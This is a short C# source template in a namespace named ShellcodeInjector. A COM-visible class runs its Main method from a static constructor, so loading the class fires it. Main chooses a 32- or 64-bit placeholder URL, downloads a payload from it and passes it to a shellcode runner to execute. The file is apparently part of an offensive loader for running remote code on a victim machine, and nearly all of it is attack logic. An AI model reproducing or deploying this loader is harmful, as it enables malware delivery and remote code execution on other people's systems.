using System;
using System.Runtime.InteropServices;

namespace ShellcodeInjector
{
    [ComVisible(true)]
    public class Program
    {
        static Program()
        {
            Main();
        }

        static void Main()
        {
            var is64Bit = IntPtr.Size == 8;
            var url = is64Bit ? "%URL64%" : "%URL32%";
            var payload = Downloader.DownloadFromUrl(url);
            ShellcodeRunner.RunPayload(payload);
        }
    }
}
